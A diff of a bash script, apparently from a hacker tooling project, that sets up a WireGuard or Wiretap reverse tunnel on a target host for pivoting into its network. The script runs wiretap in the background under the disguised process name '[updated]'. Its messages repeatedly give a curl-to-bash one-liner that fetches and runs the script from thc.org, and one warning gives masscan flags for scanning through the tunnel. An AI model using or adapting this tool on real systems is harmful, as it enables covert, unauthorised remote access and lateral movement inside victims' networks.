@@ -1,44 +1,44 @@
 #! /usr/bin/env bash
 
-# This script sets a wireguard or wiretap reverse tunnel on a target host.
+# This script sets a WireGuard or Wiretap reverse tunnel on a target host.
 
-# X=<VERSION>-<PRIV>-<PUB>-<ENDPOINT>-<DEV>-<IPV4Addr>-<IPV6Addr>
+# X=<VERSION>-<PRIV>-<PUB>-<ENDPOINT>-<ALLOWED_IPS>
 
 # Test IPv6:
 # curl -I 'http://[2606:4700:4700::1111]'
 # ping6 2606:4700:4700::1111
 
-[[ -t 1 ]] && {
-# shellcheck disable=SC2034 # Unused
-CY="\e[1;33m" # yellow
-CG="\e[1;32m" # green
-CR="\e[1;31m" # red
-CC="\e[1;36m" # cyan
-# CM="\e[1;35m" # magenta
-# CW="\e[1;37m" # white
-CB="\e[1;34m" # blue
-CF="\e[2m"    # faint
-CN="\e[0m"    # none
-# CBG="\e[42;1m" # Background Green
-# night-mode
-CDR="\e[0;31m" # red
-CDG="\e[0;32m" # green
-CDY="\e[0;33m" # yellow
-CDB="\e[0;34m" # blue
-CDM="\e[0;35m" # magenta
-CDC="\e[0;36m" # cyan
-CUL="\e[4m"
+init_color()
+{
+    # shellcheck disable=SC2034 # Unused
+    CY="\e[1;33m" # yellow
+    CG="\e[1;32m" # green
+    CR="\e[1;31m" # red
+    CC="\e[1;36m" # cyan
+    # CM="\e[1;35m" # magenta
+    # CW="\e[1;37m" # white
+    CB="\e[1;34m" # blue
+    CF="\e[2m"    # faint
+    CN="\e[0m"    # none
+    # CBG="\e[42;1m" # Background Green
+    # night-mode
+    CDR="\e[0;31m" # red
+    CDG="\e[0;32m" # green
+    CDY="\e[0;33m" # yellow
+    CDB="\e[0;34m" # blue
+    CDM="\e[0;35m" # magenta
+    CDC="\e[0;36m" # cyan
+    CUL="\e[4m"
 }
+
+[[ -t 1 ]] && init_color
 
 [[ -z $WITHOUT_IPV6 ]] && WITH_IPV6=1
 [[ -z $WITHOUT_TUNE ]] && WITH_TUNE=1
 [[ -z $TYPE ]] && TYPE="wireguard:wiretap"
 [[ -z $UID ]] && UID=$(id -u)
 
-ERR()
-{
-	echo -e >&2 "[${CR}ERROR${CN}] $*"
-}
+ERR(){ echo -e >&2 "[${CR}ERROR${CN}] $*"; }
 
 ERREXIT()
 {
@@ -59,10 +59,8 @@ WARN()
 x2data()
 {
     local IFS
-    local dfl_addres6
-    local dfl_address
-    local dfl_peer_addres6
-    local dfl_peer_address
+    local str
+    local ip
 
     IFS="-"
     CONF=($X)
@@ -71,33 +69,38 @@ x2data()
     [[ ${#CONF[1]} -ne 44 ]] && ERREXIT 255 "X= does not contain a valid private key."
     [[ ${#CONF[2]} -ne 44 ]] && ERREXIT 255 "X= does not contain a valid public key."
     
-    VER=${CONF[0]//[^0-9]}
+    [[ -z $SF_VER ]] && SF_VER=${CONF[0]//[^0-9]}
     PRIV=${CONF[1]}
     PEER=${CONF[2]}
     EP=${CONF[3]}
 
-    [[ -z $VER ]] && ERREXIT 255 "X= contains a bad version number."
+    [[ -z $SF_VER ]] && ERREXIT 255 "X= contains a bad version number."
 
-    [[ ${#CONF[@]} -ge 5 ]] && [[ -z $WG_DEV ]] && [[ ${#CONF[4]} -gt 1 ]] && WG_DEV=${CONF[4]}
-    [[ ${#CONF[@]} -ge 6 ]] && ADDRESS=${CONF[5]}
-    [[ ${#CONF[@]} -ge 7 ]] && ADDRES6=${CONF[6]}
+    str=${CONF[4]}
+    str="${str//[^0-9a-f,x:.\/]}"
+    [[ -n $str ]] && {
+        # Format: "172.16.0.x/16,fd:16::x/104"
+        ip=${str%%,*}
+        PEER_ADDRESS="${ip//x/0}"     # 172.16.0.0/16
+        ip=${ip%/*}
+        ADDRESS="${ip//x/1}/32"       # 172.16.0.0/32
+        # IPv6
+        ip=${str##*,}
+        PEER_ADDRES6="${ip//x/0}"     # fd:16::0/104
+        ip=${ip%/*}
+        ADDRES6="${ip//x/1}/128"      # fd:16::1/128
+    }
 
-    if [[ $VER -eq 2 ]]; then
-        dfl_address="172.16.0.1/32"
-        dfl_addres6="fd:16::1/128"
-        dfl_peer_address="172.16.0.0/29"
-        dfl_peer_addres6="fd:16::0/125"
-    else
-        dfl_address="192.168.0.1/32"
-        dfl_addres6="fd::1/128"
-        dfl_peer_address="192.168.0.0/29"
-        dfl_peer_addres6="fd::0/125"
-    fi
+    # [[ -z $ADDRESS ]] && ADDRESS="172.16.0.1/32"
+    # [[ -z $ADDRES6 ]] && ADDRES6="fd:16::1/128"
+    # [[ -z $PEER_ADDRESS ]] && PEER_ADDRESS="172.16.0.0/16"
+    # [[ -z $PEER_ADDRES6 ]] && PEER_ADDRES6="fd:16::0/104"
 
-    [[ -z $ADDRESS ]] && ADDRESS="$dfl_address"
-    [[ -z $ADDRES6 ]] && ADDRES6="$dfl_addres6"
-    [[ -z $PEER_ADDRESS ]] && PEER_ADDRESS="$dfl_peer_address"
-    [[ -z $PEER_ADDRES6 ]] && PEER_ADDRES6="$dfl_peer_addres6"
+    ### SF < 0.4.7 compatible
+    [[ -z $ADDRESS ]] && ADDRESS="192.168.0.1/32"
+    [[ -z $ADDRES6 ]] && ADDRES6="fd::1/128"
+    [[ -z $PEER_ADDRESS ]] && PEER_ADDRESS="192.168.0.0/16"
+    [[ -z $PEER_ADDRES6 ]] && PEER_ADDRES6="fd::0/104"
 }
 
 # Delete any IPT rule and add new one
@@ -183,7 +186,8 @@ wg_find_dev()
     }
 
     ### Check if it exists.
-    ip link show dev "${WG_DEV}" &>/dev/null && ERREXIT 255 "Device ${CDM}${WG_DEV}${CN} exists. Try ${CDC}ip link del ${WG_DEV}${CN} or ${CDC}export WG_DEV=Blah0${CN}"
+    ip link show dev "${WG_DEV}" &>/dev/null && ERREXIT 255 "Device ${CDM}${WG_DEV}${CN} exists.
+Try ${CDC}ip link del ${WG_DEV}${CN} or to use a different device try ${CDC}export WG_DEV=Blah0${CN}"
 }
 
 wg_up()
@@ -213,7 +217,6 @@ wg_up()
     addr="${PEER_ADDRESS}"
     [[ -n $WITH_IPV6 ]] && addr+=",${PEER_ADDRES6}"
     # addr="0.0.0.0/0"
-    # [[ -n $WITH_IPV6 ]] && addr+=", ::/0"
     wg set "${WG_DEV}" private-key "${fn}" peer "$PEER" allowed-ips "${addr}" endpoint "${EP}" persistent-keepalive 25 || ERREXIT 255
     rm -f "${fn}"
 
@@ -331,14 +334,14 @@ wt_up()
     if command -v pidof >/dev/null; then
         is_has_pidof=1
         cmd_checkrunning=("pidof" "[updated]")
-        pid=$(pidof '[updated]') && ERREXIT 255 "${CDM}Wiretap${CN} is already running with PID ${CDY}${pid}${CN}. Try ${CDC}${CMD_PKILL} ${killname}${CN}"
+        pid=$(pidof '[updated]') && ERREXIT 255 "${CDM}Wiretap${CN} is already running with PID ${CDY}${pid}${CN}. To stop: ${CDC}${CMD_PKILL} '${killname}'${CN}"
     elif command -v pkill >/dev/null; then
         [[ $OS == "darwin" ]] && killname="\[updated\]"
         cmd_checkrunning=("pkill" "-0" "${killname}")
-        "${cmd_checkrunning[@]}" && ERREXIT 255 "${CDM}Wiretap${CN} is already running. Try ${CDC}pkill ${killname}${CN}"
+        "${cmd_checkrunning[@]}" && ERREXIT 255 "${CDM}Wiretap${CN} is already running. To stop: ${CDC}pkill '${killname}'${CN}"
     elif command -v killall >/dev/null; then
         cmd_checkrunning=("killall" "-0" "wiretap")
-        "${cmd_checkrunning[@]}" && ERREXIT 255 "${CDM}Wiretap${CN} is already running. Try ${CDC}killall ${killname}${CN}"
+        "${cmd_checkrunning[@]}" && ERREXIT 255 "${CDM}Wiretap${CN} is already running. To stop: ${CDC}killall '${killname}'${CN}"
     fi
         
     # command -v wiretap >/dev/null || {
@@ -356,20 +359,22 @@ wt_up()
     # CWD may have changed by wt_dl
     # ./wiretap configure --simple
     unset ENVSTR
-    if [[ $VER -eq 1 ]]; then
+    if [[ $SF_VER -eq 1 ]]; then
         addenv WIRETAP_INTERFACE_PRIVATEKEY "$PRIV"
         addenv WIRETAP_PEER_PUBLICKEY "${PEER}"
         addenv WIRETAP_PEER_ENDPOINT "${EP}"
     else
-        addenv WIRETAP_RELAY_INTERFACE_PRIVATEKEY="${PRIV}"
-        addenv WIRETAP_RELAY_PEER_PUBLICKEY="${PEER}"
-        addenv WIRETAP_RELAY_PEER_ENDPOINT="${EP}"
-        addenv WIRETAP_SIMPLE=true
+        addenv WIRETAP_RELAY_INTERFACE_PRIVATEKEY "${PRIV}"
+        addenv WIRETAP_RELAY_PEER_PUBLICKEY "${PEER}"
+        addenv WIRETAP_RELAY_PEER_ENDPOINT "${EP}"
+        addenv WIRETAP_SIMPLE "true"
     fi
 
-    arg=("serve" "-q" "--allowed" "${peer_addr}")
-
-    PATH=".:$PATH" exec -a '[updated]' wiretap "${arg[@]}" &>/dev/null &
+    if [[ -z $SF_DEBUG ]]; then
+        PATH=".:$PATH" exec -a '[updated]' wiretap serve -q --allowed "${peer_addr}" &>/dev/null &
+    else
+        PATH=".:$PATH" ./wiretap serve --allowed "${peer_addr}"
+    fi
     [[ ${#cmd_checkrunning[@]} -gt 0 ]] && {
         n=0
         err=1
@@ -382,6 +387,9 @@ wt_up()
             [[ -n $is_has_pidof ]] && pidstr=" with pid=${CDY}$(pidof '[updated]')${CN}"
         else
             WARN "Failed to start wiretap."
+            echo -e "To run in the foreground:"
+            [[ -n $IS_DOWNLOADED ]] && echo -e "${CDC}${DL_CMD:-<download wiretap>}${CN}"
+            echo -e "${CDC}${ENVSTR}./wiretap serve --allowed '${peer_addr}'${CN}"
         fi
     }
     
@@ -390,27 +398,22 @@ wt_up()
 ${CDG}SUCCESS${CN} - ${CDM}Wiretap${CN} started as ${CDY}[updated]${CN}${pidstr} in the background.
 To stop   : ${CDC}${CMD_PKILL} '${killname}'${CN}"
 
-    echo -e "\
-To run in foreground:
-${CDC}${CMD_PKILL} '${killname}'${CN}"
-    [[ -n $IS_DOWNLOADED ]] && echo -e "\
-${CDC}${DL_CMD:-<download wiretap>}${CN}"
-    echo -e "\
-${CDC}${ENVSTR}./wiretap" "${arg[@]}" "${CN}"
-
-    # WARN "${CDM}Wiretap${CN} is ${CDR}not good${CN} for scanning. Consider using ${CDR}root & wireguard${CN} instead."
+    # problem with gVisor DNAT & wt <=0.3.0 TCP mixup
+    WARN "${CDM}Wiretap${CN} is ${CDR}not good${CN} for scanning.
+Masscan: use ${CDC}-e wgExit --adapter-ip 172.16.0.3-172.16.128.2 --adapter-port 1024-33791${CN}
+Alternatively use ${CDM}WireGuard:${CDC}
+    ${CMD_PKILL} '${killname}'
+    export TYPE=wireguard
+    X=\"\$X\" bash -c \"\$(curl -fsSL thc.org/sfwg)\"${CN}"
 }
 
-[[ -z $X ]] && {
-    echo -e "\
-The variable ${CDY}X=${CN} is not set. Try
-    ${CDC}X=<YourConfigurationString> ./sfwg${CN}"
+[[ -z $X ]] && ERREXIT 255 "The variable ${CDY}X=${CN} is not set. Try
+    ${CDC}X=<YourConfigurationString> bash -c \"\$(curl -fsSL thc.org/sfwg)\"${CN}"
 
-    exit 255;
-}
 x2data
 
 [[ ${TYPE} == *wireguard* ]] && [[ $UID -eq 0 ]] && { wg_up; exit; }
 [[ ${TYPE} == *wiretap* ]] && { wt_up; exit; }
 
+[[ ${TYPE} == *wireguard* ]] && [[ $UID -ne 0 ]] && ERREXIT 255 "WireGuard requires root. Try ${CDC}exort TYPE=wiretap${CN} instead."
 ERREXIT 255 "Set ${CDM}export TYPE=wiretap${CN} or ${CDM}export TYPE=wireguard${CN}"
